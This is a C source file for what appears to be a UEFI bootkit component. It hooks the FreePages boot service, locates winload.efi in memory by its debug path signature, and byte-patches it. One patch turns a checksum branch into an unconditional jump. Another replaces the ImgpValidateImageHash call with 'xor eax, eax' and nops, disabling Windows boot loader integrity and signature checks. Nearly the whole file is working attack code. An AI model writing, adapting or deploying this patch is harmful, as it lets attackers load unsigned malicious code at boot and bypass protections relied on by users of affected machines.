#include "FreePages.h"

/*!
 *
 * Purpose:
 *
 * Detects when being executed from the winload.efi module
 * and patches the signature verification in the
 * ImgpLoadPEImage routine.
 *
!*/

#define ADDRESS_BUFFER_LENGTH 64

STATIC
VOID
LogAddress(
    IN PGENTBL Gen,
    IN CONST CHAR16 *Label,
    IN UINTN Address
    )
{
    CHAR16  Buffer[ ADDRESS_BUFFER_LENGTH ];
    UINTN   Index = 0;
    UINTN   LabelIndex;
    BOOLEAN Started = FALSE;
    INTN    Shift;

    if ( Gen == NULL )
    {
        return;
    }

    if ( Label != NULL )
    {
        for ( LabelIndex = 0;
              Label[ LabelIndex ] != L'\0' && Index < ADDRESS_BUFFER_LENGTH - 1;
              ++LabelIndex )
        {
            Buffer[ Index++ ] = Label[ LabelIndex ];
        }
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L':';
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L' ';
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L'0';
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L'x';
    }

    for ( Shift = ( sizeof( Address ) * 8 ) - 4;
          Shift >= 0 && Index < ADDRESS_BUFFER_LENGTH - 2;
          Shift -= 4 )
    {
        UINTN Digit = ( Address >> Shift ) & 0xF;

        if ( ! Started )
        {
            if ( Digit == 0 && Shift != 0 )
            {
                continue;
            }

            Started = TRUE;
        }

        Buffer[ Index++ ] = ( Digit < 10 )
            ? ( CHAR16 )( L'0' + Digit )
            : ( CHAR16 )( L'A' + ( Digit - 10 ) );
    }

    if ( ! Started && Index < ADDRESS_BUFFER_LENGTH - 2 )
    {
        Buffer[ Index++ ] = L'0';
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L'\r';
    }

    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
    {
        Buffer[ Index++ ] = L'\n';
    }

    Buffer[ Index ] = L'\0';

    Gen->SystemTable->ConOut->OutputString( Gen->SystemTable->ConOut, Buffer );
}

D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN UINTN Pages )
{
    PGENTBL                     Gen = NULL;
    PUINT8                      Adr = NULL;

    BOOLEAN                     BranchPatched = FALSE;
    BOOLEAN                     HashPatched = FALSE;

    PIMAGE_DOS_HEADER           Dos = NULL;
    PIMAGE_NT_HEADERS           Nth = NULL;
    PIMAGE_DATA_DIRECTORY       Dir = NULL;
    PIMAGE_DEBUG_DIRECTORY      Dbg = NULL;
    PRSDS_DEBUG_FORMAT          Rsd = NULL;

    /* Resolve the general table structure */
    Gen = C_PTR( G_PTR( GenTbl ) );

    /* Retrieve RAX value and align it to the page boundary */
    Dos = C_PTR( U_PTR( RETURN_ADDRESS( 0 ) ) & ~ EFI_PAGE_MASK );

    do
    {
        /* Has the MZ magic? */
        if ( Dos->e_magic == IMAGE_DOS_SIGNATURE )
        {
            /* Get the NT headers */
            Nth = C_PTR( ( U_PTR( Dos ) + Dos->e_lfanew ) );

            /* Are the NT headers valid? */
            if ( Nth->Signature == IMAGE_NT_SIGNATURE )
            {
                /* Leave! */
                break;
            }
        }
        /* Step back to the previus page */
        Dos = C_PTR( U_PTR( Dos ) - EFI_PAGE_SIZE );
    } while ( TRUE );

    /* Get a pointer to the debug directory */
    Dir = C_PTR( & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_DEBUG ] );

    /* Is debug directory exist? */
    if ( Dir->VirtualAddress == 0 )
    {
        /* No? Leave! */
        goto LEAVE;
    }

    /* Calculate a debug directory pointer */
    Dbg = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

    /* Is it a code view directory? */
    if ( Dbg->Type == IMAGE_DEBUG_TYPE_CODEVIEW )
    {
        /* Get a pointer to the debug store */
        Rsd = C_PTR( U_PTR( Dos ) + Dbg->AddressOfRawData );

        /* Is it rich symbol for sure? */
        if ( Rsd->Signature == PE_PDB_RSDS_SIGNATURE )
        {
            /* Is this winload.efi? */
            if ( Rsd->Path == WINLOAD_PATH_SIGNATURE )
            {
                /* Yes! - Set up the pointer to the base of the PE image */
                Adr = C_PTR( U_PTR( Dos ) );

                LOG( L"[+] winload.efi detected" );
                LogAddress( Gen, L"[+] Image base", U_PTR( Dos ) );

                while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                {
                    /* jz short loc_180096FBF -> jmp short loc_180096FBF */
                    if ( ! BranchPatched &&
                         Adr[ 0x00 ] == 0xC1 &&
                         Adr[ 0x03 ] == 0xC7 &&
                         Adr[ 0x04 ] == 0x74 )
                    {
                        *( PUINT8 )( U_PTR( Adr + 0x04 ) ) = ( UINT8 )( 0xEB ); /* jmp */
                        BranchPatched = TRUE;
                        LogAddress( Gen, L"[+] Patched checksum branch", U_PTR( Adr + 0x04 ) );
                    }

                    /* call ImgpValidateImageHash -> xor eax, eax */
                    if ( ! HashPatched &&
                         Adr[ 0x00 ] == 0xD8 &&
                         Adr[ 0x01 ] == 0x3D &&
                         Adr[ 0x02 ] == 0x2D )
                    {
                        *( PUINT16 )( U_PTR( Adr - 0x06 ) ) = ( UINT16 )( 0xC031 ); /* xor eax, eax */
                        *( PUINT8 ) ( U_PTR( Adr - 0x04 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                        *( PUINT8 ) ( U_PTR( Adr - 0x03 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                        *( PUINT8 ) ( U_PTR( Adr - 0x02 ) ) = ( UINT8 ) ( 0x90 );   /* nop */

                        HashPatched = TRUE;
                        LogAddress( Gen, L"[+] Patched hash validation", U_PTR( Adr - 0x06 ) );
                        LOG( L"[+] winload integrity checks disabled" );

                        /* Restore the original routine */
                        Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );

                        /* Quit! */
                        goto LEAVE;
                    }

                    /* Move to next opcode */
                    Adr += 0x1;
                }
            }
        }
    }

LEAVE:
    /* Execute original routine */
    return ( ( D_API( FreePagesHook ) )( Gen->FreePages ) )( Memory, Pages );
} E_SEC;

